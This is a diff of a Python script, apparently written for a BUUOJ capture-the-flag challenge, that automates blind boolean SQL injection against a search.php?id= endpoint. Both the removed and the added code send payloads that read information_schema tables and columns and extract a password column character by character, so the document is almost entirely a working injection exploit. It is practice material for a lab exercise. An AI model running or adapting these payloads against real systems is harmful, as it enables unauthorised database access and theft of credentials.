@@ -2,41 +2,30 @@ import requests
 import time
 
 # url是随时更新的，具体的以做题时候的为准
-url = 'http://c4ab171a-843f-4606-b8e4-5ca58df32d39.node4.buuoj.cn:81/search.php?id='
-i = 0
-flag = ''
+url = 'http://050d49e0-3413-4b9c-804d-94fdf635becb.node4.buuoj.cn:81/search.php?id='
+table=""
+database=""
+flag = "ERROR"
+subs=1
 while True:
-    i += 1
-    # 从可打印字符开始
-    begin = 32
-    end = 126
-    tmp = (begin + end) // 2
-    while begin < end:
-        print(begin, tmp, end)
-        time.sleep(0.1)
-        # 爆数据库
-        # payload = "''or(ascii(substr(database(),%d,1))>%d)" % (i, tmp)
-        # 爆表
-        # payload = "''or(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),%d,1))>%d)" % (i, tmp)
-        # 爆字段
-        # payload = "''or(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME='F1naI1y')),%d,1))>%d)" % (i, tmp)
-        # 爆flag 要跑很久
-        # payload = "''or(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)" % (i, tmp)
-        # 爆flag 很快
-        payload = "''or(ascii(substr((select(password)from(F1naI1y)where(username='flag')),%d,1))>%d)" % (i, tmp)
-        # 错误示例
-        # payload = "''or(ascii(substr((select(GROUP_CONCAT(fl4gawsl))from(Flaaaaag)),%d,1))>%d)" % (i, tmp)
-
-        r = requests.get(url+payload)
-        if 'Click' in r.text:
-            begin = tmp + 1
-            tmp = (begin + end) // 2
-        else:
-            end = tmp
-            tmp = (begin + end) // 2
-
-    flag += chr(tmp)
-    print(flag)
-    if begin == 32:
-        break
+    payload = "''or(ascii(substr((database()),{0},1))={1})"
+    targetUrl=url+payload
+    for c in range(33,128):
+        res=requests.get(targetUrl.format(subs,c))
+        if flag in res.text:
+            database+=chr(c)
+            print(database)
+    subs+=1
+# subs=1
+# while True:
+#     payload = "''or(ascii(substr((select(password)from(F1naI1y)where(username='flag')),{0},1))>{1})"
+#     targetUrl = url + payload
+#     # c表示33~127位ASCII中可显示字符
+#     for c in range(33, 128):
+#         res = requests.get(targetUrl.format(subs, c))
+#         if flag in res.text:
+#             table += chr(c)
+#             print(table)
+#             # break
+#     subs+=1
 
